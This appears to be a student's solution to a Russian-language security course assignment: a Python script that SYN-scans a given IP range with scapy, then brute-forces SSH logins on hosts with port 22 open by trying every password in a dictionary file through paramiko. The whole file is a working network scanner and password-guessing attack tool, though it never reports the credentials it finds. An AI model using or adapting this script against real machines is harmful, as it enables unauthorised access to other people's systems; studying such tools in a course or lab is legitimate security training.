# Итоговое задание
# Напишите програму, сканирующую локальную сеть в поисках
# других устройств
# и затем аткающую эти устройства перебором пар паролей
# (brute force) при известном логине по ssh
# (считать, что есть словарь содержащий правильный пароль)
# Пример:
# в локальной сети находятся еще два компьютера с ip 192.168.8.1 и 192.168.8.2
# программа находит их и осуществляет brute force атаку на оба компьютера.
# Файл с паролями для атаки назовите pass.txt, он должен находиться
# в директории с программой.
# При удачном подборе пароля программа должна выводить соответствующее
# уведомление и останавливать взлом для данного компьютера
# (и продолжать атаку на другие).
# Оформите взаимодействие с программой как  с утилитой командной строки,
# например так: ./brute_ssh.py -d pass.txt -l vasya_pupkin,
# где pass.txt - файл паролей, vasya_pupkin - логин атакуемого пользователя
# ЗЫ: использовать в скрипте готовые утилиты нельзя
# (nmap, netcat, netdiscover и т.п.)
# задания со звездочокой:
# * сделайте также перебор по файлу с логинами
# ** добавьте возможность брутить ftp
# *** подумайте о многопоточности
# ![ssh lib - ParallelSSH](https://github.com/ParallelSSH/parallel-ssh)
# [ParallelSSH Docs](https://parallel-ssh.readthedocs.io/en/latest/quickstart.html)
# [ssh lib - paramiko](https://github.com/paramiko/paramiko)
# [paramiko Docs](https://docs.paramiko.org/en/stable/api/client.html)

from __future__ import annotations

import argparse
import os.path as ospath
import re
import socket
from typing import Dict, Tuple

from paramiko import (AuthenticationException, BadHostKeyException, SSHClient,
                      SSHException)
from paramiko.client import AutoAddPolicy
# import scapy.all as scapy
from scapy.all import sr
from scapy.layers.inet import IP, TCP
from scapy.plist import PacketList, SndRcvList, _PacketList


def check_ip(ip: str) -> bool:
    """Check is string a correct ip/network list"""
    # TODO: проверку не только IP, но и диаппазона и сети
    # Примеры:
    # - Правилньо 192.168.1.1 or 192.168.1.5-15 or 192.168.1.0/24
    # - Не правильно: 352.2.2.2 or 192.168.1.55-40 or 192.168.1.0/35
    # regexp_ip = r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$"
    match_str = r"^((\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3}))(([/-])(\d{1,3})){,1}$"
    # if groups = 8 - range of ip or network
    # if groups = 5 - single ip address
    # group(0) - ip
    # group(1) - 1's part of ip
    # group(2) - 2's part of ip
    # group(3) - 3's part of ip
    # group(4) - 4's part of ip
    # group(6) - spliter simbol
    # group(7) - number after spliter

    ip = ip.strip()
    spliter_simbol = None
    num_after = ""

    ip_match = re.match(match_str, ip)
    group_s = ip_match.groups() if ip_match else tuple()
    groups_len = len(group_s)
    if groups_len == 0:
        return False
    num_before = str(group_s[4])
    ip = str(group_s[0])
    spliter_simbol = group_s[6]
    num_after = str(group_s[7])
    check_ip_digits = all(
        map(lambda n: 0 <= int(n) <= 255, group_s[1:4])
    )
    if spliter_simbol is None:
        return check_ip_digits
    elif spliter_simbol == "-":
        return all(
            [
                check_ip_digits,
                0 <= int(num_before) <= 255,
                0 <= int(num_after) <= 255,
                num_before <= num_after
            ]
        )
    else:
        return all(
            [
                check_ip_digits,
                0 <= int(num_before) <= 255,
                1 <= int(num_after) <= 32
            ]
        )


def get_ip_list(ip: str) -> list[str]:
    """Convert string to list of ip addresses and/or networks"""
    list_ip = map(str.strip, ip.split(','))
    filtered_ip = filter(check_ip, list_ip)
    regexp__ip_net = r"^((\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3}))(([/])(\d{1,3})){,1}$"
    res: list[str] = []
    for p in filtered_ip:
        if re.match(regexp__ip_net, p):
            res.append(p)
        else:
            res.extend(range_ip_to_list(p))
    return res


def range_ip_to_list(ip: str) -> list[str]:
    """Convert range of ip addresses to list of allowed ip addresses"""
    ip = ip.strip()
    match_str = r"^((\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3}))(([-])(\d{1,3})){,1}$"
    ip_match = re.match(match_str, ip)
    group_s = ip_match.groups() if ip_match else tuple()
    if len(group_s) == 0:
        return list()
    # if groups = 8 - range of ip or network
    # if groups = 5 - single ip address
    # group(0) - ip
    # group(1) - 1's part of ip
    # group(2) - 2's part of ip
    # group(3) - 3's part of ip
    # group(4) - 4's part of ip
    # group(6) - spliter simbol
    # group(7) - number after spliter
    ip_mask: str = f"{group_s[1]}.{group_s[2]}.{group_s[3]}"
    ips_list: list[str] = []
    for sub_ip in range(int(group_s[4]), int(group_s[7]) + 1):
        ips_list.append(f"{ip_mask}.{str(sub_ip)}")
    return ips_list


def check_port_int(port: int) -> bool:
    """Check port type 'int'"""
    return bool(1 < port < 65353)


def check_port_tuple(port: Tuple[int, int]) -> bool:
    """Check port type 'tuple[int, int]'"""
    return bool(
        port[0] <= port[1]
        and check_port_int(port[0])
        and check_port_int(port[1])
    )


def check_port(port: int | tuple[int, int]) -> bool:
    """Check port. Allowed input type: 'int' and 'tuple[int, int]'"""
    if isinstance(port, int):
        return check_port_int(port)
    if type(port) is tuple:
        return check_port_tuple(port)
    return False


def filter_ports(ports: str) -> list[int | tuple[int, int]]:
    """Parse string to ports list"""
    regexp_port = r"(^[1-9]{1}\d{,5}$|^[1-9]{1}\d{,5}-[1-9]{1}\d{,5}$)"
    filtered_ports_str = filter(
        lambda p: re.findall(regexp_port, p), ports.split(',')
    )
    pre_list = map(
        lambda p: (
            int(p.split('-')[0]),
            int(p.split('-')[1])
            ) if "-" in p else int(p),
        filtered_ports_str
    )
    return list(
        filter(
            check_port,
            pre_list
        )
    )


def args():
    """Parsing args entered in commandline"""
    parser = argparse.ArgumentParser(__doc__)
    parser.description = (
        "Программа поиска открытых портов."
        )
    parser.add_argument(
        "host",
        default="192.168.1.1",
        help=(
            "host(s) to scan: 192.168.1.1 or 192.168.1.5-15 or 192.168.1.0/24")
        )
    parser.add_argument(
        "port",
        default="22",
        help="port(s) to scan: 22 or 22,23 or 22-25")
    parser.add_argument(
        "login",
        default="root",
        help="login to using in brutforce operations")
    parser.add_argument(
        "dict_file",
        default="dict.txt",
        help="Password dictionary file")
    return parser.parse_args()


def scan_ip_port(
    ip: list[str],
    port: list[int | tuple[int, int]]
) -> list[tuple[str, str]]:
    ans, unans = sr(
        IP(dst=ip)/TCP(dport=port, flags="S"),
        inter=0.01, retry=1, timeout=0.5)
    return [
        (s[IP].dst, s[TCP].dport) for s, r in ans.filter(
            lambda s, r: (
                r.haslayer(TCP) and r.getlayer(TCP).flags == "SA"
            )
        )
    ]


def check_ssh(
    host: str,
    user: str,
    pwd: str,
    timeout: float = 3
) -> Dict[str, bool | str]:
    """ Doc: Function to check ssh host connection """
    client = SSHClient()
    client.set_missing_host_key_policy(policy=AutoAddPolicy)
    result = {"result": False, "msg": ""}
    try:
        client.connect(
            hostname=host,
            timeout=timeout,
            username=user,
            password=pwd
        )
        result["result"] = True
        result["msg"] = "The connection was successful."
        return result
    except BadHostKeyException as error:
        result["result"] = False
        result["msg"] = f"The connection was unsuccessful. Error msg: {error}"
    except AuthenticationException as error:
        result["result"] = False
        result["msg"] = f"Raise 'AuthenticationException'. Error msg: {error}"
    except SSHException as error:
        result["result"] = False
        result["msg"] = f"Raise 'SSHException'. Error msg: {error}"
    except socket.error as error:
        result["result"] = False
        result["msg"] = f"Raise 'socket.error'. Error msg: {error}"
    finally:
        client.close()
    return result


def run_scan(host: str, port: str) -> list[tuple[str, str]]:
    """Return list of found opened ports on hosts"""
    open_ports: list[tuple[str, str]] = []
    if host and port:
        print(f"Entered host= {host}")
        print(f"Entered port= {port}")
        ip_list = get_ip_list(host)
        is_ip_exist = bool(len(ip_list) > 0)
        ports = filter_ports(port)
        is_port_exist = bool(len(ports) > 0)

        print("Scaning started:")
        if is_ip_exist and is_port_exist:
            print(f"Ip to scan: {ip_list}")
            print(f"Ports to scan: {ports}")
            open_ports = scan_ip_port(ip_list, ports)
            print(open_ports)
        else:
            print("Wrong params entered.")

        print("Scaning finished.")
        return open_ports
    else:
        return open_ports


def brute_host(
    host: str,
    login: str,
    pwd_file: str
) -> list[tuple[str, str, str]]:
    """Brute host ssh password using dictionary"""
    finded_credential: list[tuple[str, str, str]] = []
    with open(pwd_file, 'r', encoding='utf-8') as file:
        for pwd in file:
            pwd = pwd.strip()
            if check_ssh(host=host, user=login, pwd=pwd)['result']:
                finded_credential.append((host, login, pwd))
    return finded_credential


def check_options(options: argparse.Namespace) -> bool:
    """Check is entered options is valid"""
    is_host = bool(get_ip_list(options.host))
    is_port = bool(len(filter_ports(options.port)))
    is_name = bool(len(options.login))
    is_file = ospath.exists(options.dict_file)

    return bool(
        is_host and
        is_port and
        is_name and
        is_file
    )


if __name__ == '__main__':
    options = args()
    is_options: bool = check_options(options)
    if not is_options:
        print("Ошибка в принятых агрументах.")
        exit()
    founded_hosts = run_scan(options.host, options.port)
    ssh_hosts = map(
        lambda h: h[0],
        filter(lambda p: p[1] == 22, founded_hosts)
    )

    host_credentials: list[tuple[str, str, str]] = []
    for ssh_host in ssh_hosts:
        cred = brute_host(ssh_host, options.login, options.dict_file)
        if cred:
            host_credentials.extend(cred)
